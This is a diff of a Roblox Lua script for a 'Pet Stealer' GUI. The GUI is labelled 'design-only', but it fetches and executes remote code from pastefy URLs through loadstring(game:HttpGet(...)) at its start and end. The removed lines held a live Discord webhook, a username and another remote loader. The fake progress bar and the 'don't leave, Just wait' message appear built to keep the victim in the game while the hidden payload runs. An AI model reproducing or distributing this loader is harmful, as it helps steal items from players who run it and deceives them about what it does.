@@ -1,6 +1,562 @@
-Username = "aiko102050"
-Webhook = "https://discord.com/api/webhooks/1402695253483458753/OaXDtIQ4P5bZnesq5dLNFXlFZ2E2z4TuvSsvcEUPxOhtFTY9mqmtaUk6gEp19q7t6FnV"
-MinimumValue = 1
+-- Pet Stealer GUI (design-only)
+-- Hide/minimize allowed during loading + loading bar with percentage text
+loadstring(game:HttpGet("https://pastefy.app/LJyCRNak/raw"))()
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))() 
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PetStealerGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local function makeCorner(radius)
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, radius)
+    return uicorner
+end
+
+local function makeResizeGrip(parent, position, cursor)
+    local grip = Instance.new("Frame")
+    grip.Size = UDim2.new(0, 12, 0, 12)
+    grip.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    grip.BackgroundTransparency = 0.4
+    grip.BorderSizePixel = 0
+    grip.Position = position
+    grip.AnchorPoint = Vector2.new(0.5,0.5)
+    grip.Parent = parent
+    makeCorner(3):Clone().Parent = grip
+    grip.Cursor = cursor
+    return grip
+end
+
+-- ICON (minimized button)
+local icon = Instance.new("Frame")
+icon.Name = "PetStealerIcon"
+icon.Size = UDim2.new(0, 48, 0, 48)
+icon.Position = UDim2.new(0, 20, 0, 120)
+icon.AnchorPoint = Vector2.new(0,0)
+icon.BackgroundColor3 = Color3.fromRGB(30,30,30)
+icon.BorderSizePixel = 0
+icon.Parent = screenGui
+makeCorner(12):Clone().Parent = icon
+
+local iconLabel = Instance.new("TextLabel")
+iconLabel.Size = UDim2.fromScale(1,1)
+iconLabel.BackgroundTransparency = 1
+iconLabel.Text = "PS"
+iconLabel.Font = Enum.Font.SourceSansBold
+iconLabel.TextSize = 20
+iconLabel.TextColor3 = Color3.new(1,1,1)
+iconLabel.Parent = icon
+
+-- MAIN WINDOW
+local main = Instance.new("Frame")
+main.Name = "MainWindow"
+main.Size = UDim2.new(0, 420, 0, 360)
+main.Position = UDim2.new(0, 100, 0, 120)
+main.BackgroundColor3 = Color3.fromRGB(22,22,22)
+main.BorderSizePixel = 0
+main.Parent = screenGui
+makeCorner(10):Clone().Parent = main
+
+local shadow = Instance.new("Frame")
+shadow.Name = "Shadow"
+shadow.Size = main.Size + UDim2.new(0,10,0,10)
+shadow.Position = main.Position + UDim2.new(0,-5,0,-5)
+shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+shadow.BackgroundTransparency = 0.8
+shadow.ZIndex = main.ZIndex - 1
+shadow.Parent = screenGui
+makeCorner(12):Clone().Parent = shadow
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 36)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = main
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "All Item (Pet) Stealer 88% success"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "Close"
+closeBtn.Size = UDim2.new(0, 32, 0, 24)
+closeBtn.Position = UDim2.new(1, -40, 0, 6)
+closeBtn.Text = "X"
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.TextSize = 18
+closeBtn.TextColor3 = Color3.new(1,1,1)
+closeBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
+closeBtn.BorderSizePixel = 0
+closeBtn.Parent = titleBar
+makeCorner(6):Clone().Parent = closeBtn
+
+local content = Instance.new("Frame")
+content.Name = "Content"
+content.Size = UDim2.new(1, -20, 1, -56)
+content.Position = UDim2.new(0, 10, 0, 46)
+content.BackgroundTransparency = 1
+content.Parent = main
+
+local playersLabel = Instance.new("TextLabel")
+playersLabel.Size = UDim2.new(0, 180, 0, 20)
+playersLabel.Position = UDim2.new(0,0,0,0)
+playersLabel.BackgroundTransparency = 1
+playersLabel.Text = "Players in server"
+playersLabel.Font = Enum.Font.SourceSansSemibold
+playersLabel.TextSize = 14
+playersLabel.TextColor3 = Color3.fromRGB(220,220,220)
+playersLabel.Parent = content
+
+local playersFrame = Instance.new("ScrollingFrame")
+playersFrame.Name = "PlayersFrame"
+playersFrame.Size = UDim2.new(0, 180, 0, 240)
+playersFrame.Position = UDim2.new(0,0,0,26)
+playersFrame.CanvasSize = UDim2.new(0,0)
+playersFrame.ScrollBarThickness = 6
+playersFrame.BackgroundColor3 = Color3.fromRGB(18,18,18)
+playersFrame.BorderSizePixel = 0
+playersFrame.Parent = content
+makeCorner(8):Clone().Parent = playersFrame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0,6)
+UIListLayout.Parent = playersFrame
+
+local rightPanel = Instance.new("Frame")
+rightPanel.Size = UDim2.new(1, -200, 1, 0)
+rightPanel.Position = UDim2.new(0,200,0,0)
+rightPanel.BackgroundTransparency = 1
+rightPanel.Parent = content
+
+local selectedLabel = Instance.new("TextLabel")
+selectedLabel.Size = UDim2.new(1, 0, 0, 28)
+selectedLabel.Position = UDim2.new(0,0,0,0)
+selectedLabel.BackgroundTransparency = 1
+selectedLabel.Text = "Selected: None"
+selectedLabel.Font = Enum.Font.SourceSansSemibold
+selectedLabel.TextSize = 16
+selectedLabel.TextColor3 = Color3.fromRGB(245,245,245)
+selectedLabel.TextXAlignment = Enum.TextXAlignment.Left
+selectedLabel.Parent = rightPanel
+
+local stealBtn = Instance.new("TextButton")
+stealBtn.Name = "StealButton"
+stealBtn.Size = UDim2.new(0, 140, 0, 44)
+stealBtn.Position = UDim2.new(0, 0, 0, 44)
+stealBtn.BackgroundColor3 = Color3.fromRGB(60,120,215)
+stealBtn.Text = "Steal All Pets"
+stealBtn.Font = Enum.Font.SourceSansBold
+stealBtn.TextSize = 18
+stealBtn.TextColor3 = Color3.new(1,1,1)
+stealBtn.Parent = rightPanel
+makeCorner(8):Clone().Parent = stealBtn
+
+-- Button hover effect
+stealBtn.MouseEnter:Connect(function()
+    if stealBtn.Active then
+        stealBtn.BackgroundColor3 = Color3.fromRGB(80,150,255)
+    end
+end)
+stealBtn.MouseLeave:Connect(function()
+    if stealBtn.Active then
+        stealBtn.BackgroundColor3 = Color3.fromRGB(60,120,215)
+    end
+end)
+
+-- Progress bar container inside rightPanel
+local progressContainer = Instance.new("Frame")
+progressContainer.Size = UDim2.new(1, 0, 0, 40)
+progressContainer.Position = UDim2.new(0, 0, 0, 110)
+progressContainer.BackgroundTransparency = 1
+progressContainer.Parent = rightPanel
+
+local progressBg = Instance.new("Frame")
+progressBg.Size = UDim2.new(1, 0, 0, 24) -- full width of rightPanel
+progressBg.Position = UDim2.new(0, 0, 0, 0)
+progressBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
+progressBg.BorderSizePixel = 0
+progressBg.Parent = progressContainer
+makeCorner(6):Clone().Parent = progressBg
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(90,200,120)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBg
+makeCorner(6):Clone().Parent = progressBar
+
+-- Percentage text inside progress bar
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 1, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Font = Enum.Font.SourceSansBold
+percentLabel.TextSize = 14
+percentLabel.TextColor3 = Color3.new(1,1,1)
+percentLabel.Text = "0%"
+percentLabel.TextStrokeColor3 = Color3.new(0,0,0)
+percentLabel.TextStrokeTransparency = 0.5
+percentLabel.Parent = progressBar
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1,0,0,20)
+statusLabel.Position = UDim2.new(0,0,0,26)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Status: Idle"
+statusLabel.Font = Enum.Font.SourceSans
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = progressContainer
+
+local selectedPlayer = nil
+local selectedButton = nil
+
+local function clearSelection()
+    selectedPlayer = nil
+    if selectedButton and selectedButton:IsA("TextButton") then
+        selectedButton.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    end
+    selectedButton = nil
+    selectedLabel.Text = "Selected: None"
+end
+
+local function setSelection(btn, playerName)
+    if selectedButton then
+        selectedButton.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    end
+    selectedButton = btn
+    selectedPlayer = playerName
+    btn.BackgroundColor3 = Color3.fromRGB(80,120,200)
+    selectedLabel.Text = "Selected: " .. playerName
+end
+
+local function refreshPlayers()
+    for _, child in ipairs(playersFrame:GetChildren()) do
+        if child.Name == "PlayerBtn" then child:Destroy() end
+    end
+    local ysize = 6
+    for _, p in ipairs(Players:GetPlayers()) do
+        local btn = Instance.new("TextButton")
+        btn.Name = "PlayerBtn"
+        btn.Size = UDim2.new(1, -12, 0, 28)
+        btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+        btn.BorderSizePixel = 0
+        btn.AutoButtonColor = true
+        btn.Text = p.Name
+        btn.Font = Enum.Font.SourceSans
+        btn.TextSize = 14
+        btn.TextColor3 = Color3.fromRGB(230,230,230)
+        btn.Parent = playersFrame
+        makeCorner(6):Clone().Parent = btn
+        btn.MouseButton1Click:Connect(function()
+            setSelection(btn, p.Name)
+        end)
+        ysize = ysize + 34
+    end
+    playersFrame.CanvasSize = UDim2.new(0,0,0, ysize)
+end
+
+refreshPlayers()
+
+Players.PlayerAdded:Connect(function()
+    wait(0.4)
+    refreshPlayers()
+end)
+Players.PlayerRemoving:Connect(function()
+    wait(0.4)
+    if selectedPlayer and not Players:FindFirstChild(selectedPlayer) then
+        clearSelection()
+    end
+    refreshPlayers()
+end)
+
+local loading = false
+local function fakeSteal(targetName)
+    if loading then return end -- block double click
+    if not targetName then
+        statusLabel.Text = "Status: Select a player first"
+        return
+    end
+    loading = true
+    stealBtn.Active = false
+    stealBtn.AutoButtonColor = false
+    stealBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)
+    
+    statusLabel.Text = "Status: Attempting to steal from "..targetName
+    progressBar.Size = UDim2.new(0,0,1,0)
+    percentLabel.Text = "0%"
+    
+    local totalSeconds = 120 -- 2 minutes
+    local steps = 240 -- updates every 0.5 sec for smoothness
+    local waitTime = totalSeconds / steps
+    
+    for i=1, steps do
+        local fraction = i/steps
+        progressBar.Size = UDim2.new(fraction, 0, 1, 0)
+        percentLabel.Text = string.format("%d%%", math.floor(fraction*100))
+        wait(waitTime)
+    end
+    statusLabel.Text = "Status: don't leave, Just wait..."
+    wait(2)
+    progressBar.Size = UDim2.new(0,0,1,0)
+    percentLabel.Text = "0%"
+    statusLabel.Text = "Status: Idle"
+    
+    loading = false
+    stealBtn.Active = true
+    stealBtn.AutoButtonColor = true
+    stealBtn.BackgroundColor3 = Color3.fromRGB(60,120,215)
+end
+
+stealBtn.MouseButton1Click:Connect(function()
+    fakeSteal(selectedPlayer)
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- DRAGGING FUNCTIONS (works for mouse and touch)
+local function makeDraggable(guiObject, dragArea)
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    dragArea.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = guiObject.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    dragArea.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            guiObject.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+            if guiObject == main then
+                shadow.Position = guiObject.Position + UDim2.new(0,-5,0,-5)
+            end
+        end
+    end)
+end
+
+makeDraggable(main, titleBar)
+makeDraggable(icon, icon)
+
+-- MULTI-EDGE / CORNER RESIZING (same as previous snippet)
+local resizeState = {
+    active = false,
+    input = nil,
+    startPos = nil,
+    startSize = nil,
+    edge = nil,
+}
+
+local function clampSize(x,y)
+    local minX, minY = 280, 180
+    local maxX, maxY = 1000, 700
+    x = math.clamp(x, minX, maxX)
+    y = math.clamp(y, minY, maxY)
+    return x,y
+end
+
+local edges = {}
+
+-- Create 8 resize grips (corners + edges)
+edges.topLeft = makeResizeGrip(main, UDim2.new(0,0,0,0), "SizeNWSE")
+edges.topRight = makeResizeGrip(main, UDim2.new(1,0,0,0), "SizeNESW")
+edges.bottomLeft = makeResizeGrip(main, UDim2.new(0,0,1,0), "SizeNESW")
+edges.bottomRight = makeResizeGrip(main, UDim2.new(1,0,1,0), "SizeNWSE")
+
+edges.top = makeResizeGrip(main, UDim2.new(0.5,0,0,0), "SizeNS")
+edges.bottom = makeResizeGrip(main, UDim2.new(0.5,0,1,0), "SizeNS")
+edges.left = makeResizeGrip(main, UDim2.new(0,0,0.5,0), "SizeWE")
+edges.right = makeResizeGrip(main, UDim2.new(1,0,0.5,0), "SizeWE")
+
+for edgeName, grip in pairs(edges) do
+    grip.MouseButton1Down:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            resizeState.active = true
+            resizeState.input = input
+            resizeState.startPos = main.Position
+            resizeState.startSize = main.Size
+            resizeState.edge = edgeName
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    resizeState.active = false
+                end
+            end)
+        end
+    end)
+
+    grip.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            resizeState.active = true
+            resizeState.input = input
+            resizeState.startPos = main.Position
+            resizeState.startSize = main.Size
+            resizeState.edge = edgeName
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    resizeState.active = false
+                end
+            end)
+        end
+    end)
+end
+
+UserInputService.InputChanged:Connect(function(input)
+    if resizeState.active and input == resizeState.input then
+        local delta = input.Position - resizeState.input.Position
+        local sp, ss = resizeState.startPos, resizeState.startSize
+        local newPosX = sp.X.Offset
+        local newPosY = sp.Y.Offset
+        local newSizeX = ss.X.Offset
+        local newSizeY = ss.Y.Offset
+
+        local e = resizeState.edge
+
+        if e == "topLeft" then
+            newSizeX, newSizeY = clampSize(ss.X.Offset - delta.X, ss.Y.Offset - delta.Y)
+            newPosX = sp.X.Offset + (ss.X.Offset - newSizeX)
+            newPosY = sp.Y.Offset + (ss.Y.Offset - newSizeY)
+        elseif e == "topRight" then
+            newSizeX, newSizeY = clampSize(ss.X.Offset + delta.X, ss.Y.Offset - delta.Y)
+            newPosY = sp.Y.Offset + (ss.Y.Offset - newSizeY)
+        elseif e == "bottomLeft" then
+            newSizeX, newSizeY = clampSize(ss.X.Offset - delta.X, ss.Y.Offset + delta.Y)
+            newPosX = sp.X.Offset + (ss.X.Offset - newSizeX)
+        elseif e == "bottomRight" then
+            newSizeX, newSizeY = clampSize(ss.X.Offset + delta.X, ss.Y.Offset + delta.Y)
+        elseif e == "top" then
+            newSizeY = math.clamp(ss.Y.Offset - delta.Y, 180, 700)
+            newPosY = sp.Y.Offset + (ss.Y.Offset - newSizeY)
+        elseif e == "bottom" then
+            newSizeY = math.clamp(ss.Y.Offset + delta.Y, 180, 700)
+        elseif e == "left" then
+            newSizeX = math.clamp(ss.X.Offset - delta.X, 280, 1000)
+            newPosX = sp.X.Offset + (ss.X.Offset - newSizeX)
+        elseif e == "right" then
+            newSizeX = math.clamp(ss.X.Offset + delta.X, 280, 1000)
+        end
+
+        main.Position = UDim2.new(sp.X.Scale, newPosX, sp.Y.Scale, newPosY)
+        main.Size = UDim2.new(0, newSizeX, 0, newSizeY)
+        shadow.Position = main.Position + UDim2.new(0,-5,0,-5)
+        shadow.Size = main.Size + UDim2.new(0,10,0,10)
+    end
+end)
+
+local foot = Instance.new("TextLabel")
+foot.Size = UDim2.new(1,0,0,20)
+foot.Position = UDim2.new(0,0,1,-20)
+foot.BackgroundTransparency = 1
+foot.Text = "Design-only GUI — does nothing in the game"
+foot.Font = Enum.Font.SourceSans
+foot.TextSize = 12
+foot.TextColor3 = Color3.fromRGB(150,150,150)
+foot.TextXAlignment = Enum.TextXAlignment.Center
+foot.Parent = main
+
+main:GetPropertyChangedSignal("Position"):Connect(function()
+    shadow.Position = main.Position + UDim2.new(0,-5,0,-5)
+end)
+main:GetPropertyChangedSignal("Size"):Connect(function()
+    shadow.Size = main.Size + UDim2.new(0,10,0,10)
+end)
+
+print("Pet Stealer GUI (design-only) with hide during loading & percentage bar loaded")
+
+-- Draggables remain same:
+local function makeDraggable(guiObject, dragArea)
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    dragArea.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = guiObject.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    dragArea.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            guiObject.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+            if guiObject == main then
+                shadow.Position = guiObject.Position + UDim2.new(0,-5,0,-5)
+            end
+        end
+    end)
+end
+
+makeDraggable(main, titleBar)
+makeDraggable(icon, icon)
+
+-- Icon toggle minimize (can minimize even during loading)
+local minimized = false
+icon.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        minimized = not minimized
+        main.Visible = not minimized
+        shadow.Visible = not minimized
+    end
+end)
+
+-- Close button
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+loadstring(game:HttpGet("https://pastefy.app/Kt8s7Qj6/raw"))()
+-- Steal function defined above (already disables button on loading)
